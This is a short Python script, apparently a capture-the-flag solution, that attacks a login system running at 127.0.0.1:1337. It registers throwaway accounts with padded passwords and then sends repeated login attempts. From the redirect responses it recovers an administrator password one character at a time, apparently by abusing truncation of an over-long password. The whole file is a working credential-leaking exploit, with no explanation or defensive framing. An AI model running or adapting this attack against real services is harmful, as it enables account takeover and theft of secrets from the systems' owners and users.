import random
import string
from time import sleep

import requests

base = "http://127.0.0.1:1337/"

N = 10
ADMIN_PASSWORD = ""

while True:
    username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
    password = "A" * (71 - len(ADMIN_PASSWORD)) + "PASSWORD"

    response = requests.post(base + "register",
                             {"username": username, "password": password})
    sleep(0.1)

    if response.ok:
        for i in string.printable:
            password = "A" * (71 - len(ADMIN_PASSWORD)) + ADMIN_PASSWORD + i
            response = requests.post(base + "login",
                                     data={"username": username, "password": password},
                                     allow_redirects=False)
            sleep(0.1)
            if response.headers["location"] == "/":
                print(f"Found character: |{i}|")
                ADMIN_PASSWORD += i
                break
            elif response.headers["location"] == "/login":
                continue
            else:
                raise Exception(":/")
        else:
            break
    print(f"Current ADMIN_PASSWORD: |{ADMIN_PASSWORD}|")
